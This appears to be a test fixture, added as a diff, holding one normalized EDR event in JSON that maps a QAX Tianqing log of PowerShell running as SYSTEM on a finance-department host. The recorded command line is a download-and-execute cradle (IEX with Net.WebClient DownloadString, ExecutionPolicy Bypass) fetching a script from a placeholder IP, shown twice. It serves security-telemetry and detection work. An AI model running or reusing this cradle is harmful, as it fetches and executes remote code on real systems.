@@ -1,0 +1,129 @@
+{
+  "meta": {
+    "schema_version": "2.0",
+    "tenant_id": "tenant01",
+    "event_id": "evt-7b7dcb3590bb4a7037cbb6f3033f207a7b0a1dbcde76d4b4a9ee10bb1d49c472",
+    "occur_time": "2026-08-20T10:05:00Z",
+    "ingest_time": "2026-08-20T10:05:01.500Z",
+    "parse_time": "2026-08-20T10:05:02.500Z",
+    "mapping_id": "qax.tianqing.edr_powershell_cmd_exec.behavior.v1",
+    "data_source": {
+      "vendor": "qax",
+      "product": "tianqing",
+      "category": "audit",
+      "instance_id": "collector-tianqing-poc-01"
+    },
+    "source_record": {
+      "log_id": "log-tianqing-poc-0006",
+      "record_kind": "activity",
+      "log_type": "edr_powershell_cmd_exec",
+      "log_name": "天擎 EDR PowerShell 命令执行",
+      "log_level": "info"
+    }
+  },
+  "event_kind": "behavior",
+  "behavior": {
+    "layer": "system",
+    "type": "change",
+    "operation": null,
+    "outcome": "observed",
+    "message": null
+  },
+  "subject": {
+    "ref_id": "host::2868257359929541780",
+    "entity_type": "host",
+    "host": {
+      "id": "2868257359929504570",
+      "name": "DESKTOP-FIN-0457",
+      "ip": "192.0.2.111",
+      "mac": "00:00:5E:00:53:6E"
+    }
+  },
+  "object": null,
+  "carriers": [
+    {
+      "ref_id": "process::17315699910326c507f53b59d93c68b7",
+      "entity_type": "process",
+      "process": {
+        "name": "powershell.exe",
+        "uid": "17315699910326c507f53b59d93c68b7",
+        "pid": "16400",
+        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.15/a.ps1')",
+        "created_time": 1734466207744,
+        "user": {
+          "name": "NT AUTHORITY\\SYSTEM",
+          "id": "S-1-5-18"
+        },
+        "file": {
+          "internal_name": "POWERSHELL",
+          "hashes": {
+            "md5": "2e5a8590cf6848968fc23de3fa1e25f1",
+            "sha1": "801262e122db6a2e758962896f260b55bbd0136a"
+          },
+          "signatures": [
+            {
+              "signer": "Microsoft Windows"
+            }
+          ]
+        }
+      },
+      "carrier_role": "process"
+    },
+    {
+      "ref_id": "script::12e821ca_0d5c_409a_8bbf_fa39567d4d70",
+      "entity_type": "script",
+      "script": {
+        "id": "12e821ca-0d5c-409a-8bbf-fa39567d4d70",
+        "language": "powershell",
+        "command": "IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.15/a.ps1')"
+      },
+      "carrier_role": "script"
+    }
+  ],
+  "facets": {},
+  "observation": {
+    "observation_id": "obs-7b7dcb3590bb4a7037cbb6f3033f207a7b0a1dbcde76d4b4a9ee10bb1d49c472",
+    "observer": {
+      "ref_id": "application::tianqing",
+      "entity_type": "application",
+      "application": {
+        "name": "tianqing",
+        "vendor": "qax"
+      }
+    },
+    "action": "record",
+    "evidence_refs": [
+      "source_record:log-tianqing-poc-0006"
+    ]
+  },
+  "extensions": {
+    "source_private": {
+      "windows_event_id": "4104",
+      "thread_id": 14728,
+      "keywords": "0x0"
+    },
+    "profiles": {
+      "endpoint_asset": {
+        "subject_ref": {
+          "ref_id": "host_2868257359929541780"
+        },
+        "agent": {
+          "id": "08810457-poc9a3f25c7e1d48026b5fa09c47e1d2e3",
+          "fingerprint_id": "c3f1a0d92e47b615f0a8d3c25e97b1846fa209cde53b7a1d608f94e2cb37d5696",
+          "version": "edr-8.0"
+        },
+        "ownership": {
+          "organization": {
+            "id": "2653788242175804570"
+          },
+          "group": {
+            "id": "7e2b91c4a5d03f08",
+            "name": "财务部终端"
+          }
+        }
+      }
+    },
+    "enrichments": {}
+  }
+}
